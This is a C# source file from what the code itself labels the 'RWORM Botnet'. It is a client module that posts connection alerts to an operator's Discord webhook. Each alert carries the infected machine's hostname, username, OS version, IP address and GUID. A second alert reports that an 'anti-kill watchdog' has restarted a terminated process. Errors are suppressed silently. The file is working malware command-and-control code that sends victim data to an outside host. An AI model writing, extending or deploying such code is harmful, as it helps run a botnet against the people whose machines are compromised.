using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace RWORM.Client.Modules
{
    public static class DiscordNotifier
    {
        private static readonly HttpClient Http = new HttpClient { Timeout = TimeSpan.FromSeconds(10) };

        private static string EscapeJson(string? s)
        {
            if (s == null) return "";
            var sb = new StringBuilder(s.Length);
            foreach (char c in s)
            {
                switch (c)
                {
                    case '\\': sb.Append("\\\\"); break;
                    case '"':  sb.Append("\\\""); break;
                    case '\b': sb.Append("\\b");  break;
                    case '\f': sb.Append("\\f");  break;
                    case '\n': sb.Append("\\n");  break;
                    case '\r': sb.Append("\\r");  break;
                    case '\t': sb.Append("\\t");  break;
                    default:
                        if (c < ' ')
                            sb.AppendFormat("\\u{0:x4}", (int)c);
                        else
                            sb.Append(c);
                        break;
                }
            }
            return sb.ToString();
        }

        public static async Task SendConnectAlertAsync(
            string webhookUrl,
            string hostname,
            string username,
            string os,
            string ip,
            string guid)
        {
            if (string.IsNullOrWhiteSpace(webhookUrl) || !webhookUrl.StartsWith("http", StringComparison.OrdinalIgnoreCase))
                return;

            try
            {
                var h = EscapeJson(hostname);
                var u = EscapeJson(username);
                var o = EscapeJson(os);
                var i = EscapeJson(string.IsNullOrWhiteSpace(ip) ? "Unknown" : ip);
                var g = EscapeJson(guid);

                var json = $"{{\"username\":\"RWORM C2 Alert\",\"avatar_url\":\"https://raw.githubusercontent.com/exsarorrayzer/rworm/main/assets/logo.png\",\"embeds\":[{{\"title\":\"\ud83d\udfe2 Client Connected Online\",\"description\":\"**Host:** `{h}`\\n**User:** `{u}`\",\"color\":3066993,\"fields\":[{{\"name\":\"IP Address\",\"value\":\"{i}\",\"inline\":true}},{{\"name\":\"OS Version\",\"value\":\"{o}\",\"inline\":true}},{{\"name\":\"Client GUID\",\"value\":\"`{g}`\",\"inline\":false}}],\"footer\":{{\"text\":\"RWORM Botnet \u2022 Connection Alert\"}},\"timestamp\":\"{DateTime.UtcNow:o}\"}}]}}";

                using var content = new StringContent(json, Encoding.UTF8, "application/json");
                await Http.PostAsync(webhookUrl, content).ConfigureAwait(false);
            }
            catch
            {
                
            }
        }

        public static async Task SendReviveAlertAsync(string webhookUrl, string targetExe)
        {
            if (string.IsNullOrWhiteSpace(webhookUrl) || !webhookUrl.StartsWith("http", StringComparison.OrdinalIgnoreCase))
                return;

            try
            {
                var exe = EscapeJson(targetExe);
                var host = EscapeJson(Environment.MachineName);
                var user = EscapeJson(Environment.UserName);

                var json = $"{{\"username\":\"RWORM Watchdog\",\"avatar_url\":\"https://raw.githubusercontent.com/exsarorrayzer/rworm/main/assets/logo.png\",\"embeds\":[{{\"title\":\"\ud83d\udee1\ufe0f Anti-Kill Watchdog Alert\",\"description\":\"\u26a0\ufe0f **Target process was killed!**\\nBackup watchdog successfully revived: `{exe}`\",\"color\":15158332,\"fields\":[{{\"name\":\"Host\",\"value\":\"{host}\",\"inline\":true}},{{\"name\":\"User\",\"value\":\"{user}\",\"inline\":true}}],\"footer\":{{\"text\":\"RWORM Watchdog Subsystem\"}},\"timestamp\":\"{DateTime.UtcNow:o}\"}}]}}";

                using var content = new StringContent(json, Encoding.UTF8, "application/json");
                await Http.PostAsync(webhookUrl, content).ConfigureAwait(false);
            }
            catch
            {
                
            }
        }
    }
}
